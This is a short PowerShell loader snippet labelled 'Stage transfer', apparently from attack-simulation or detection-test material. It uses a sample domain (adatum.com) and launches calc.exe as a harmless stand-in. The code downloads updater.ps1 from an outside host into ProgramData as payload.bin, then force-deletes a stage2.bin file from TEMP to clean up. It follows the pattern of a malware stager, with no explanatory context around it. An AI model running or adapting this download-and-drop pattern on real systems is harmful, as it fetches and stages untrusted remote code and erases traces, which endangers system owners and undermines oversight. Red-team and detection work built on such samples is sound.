
<# Stage transfer #> try { $PayloadUrl = 'http://adatum.com:80/updater.ps1'; $DropPath = 'C:\ProgramData\payload.bin'; curl.exe -s -L -o $DropPath $PayloadUrl; Start-Process -FilePath "calc.exe" -ErrorAction SilentlyContinue; Remove-Item -Path "$env:TEMP\stage2.bin" -Force } catch { Write-Warning "Loader step failed" }
